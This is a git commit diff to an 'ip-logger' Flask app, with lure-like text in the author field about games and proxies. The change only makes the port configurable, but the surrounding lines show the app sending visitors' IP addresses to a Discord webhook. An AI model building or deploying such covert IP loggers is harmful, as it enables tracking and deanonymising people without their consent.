ba1709284c712d7012eac8c3e38c87a2f2468df1
click on the notes button to see the games and proxies. <129241649+glumpyss@users.noreply.github.com>
2025-06-12 02:55:11 -0400

    main.py

--- ip-logger/main.py
+++ ip-logger/main.py
@@ -1,5 +1,6 @@
 from flask import Flask, request
 import requests
+import os
 
 app = Flask(__name__)
 
@@ -18,4 +19,5 @@ def send_to_discord(ip):
     requests.post(WEBHOOK_URL, json=data)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
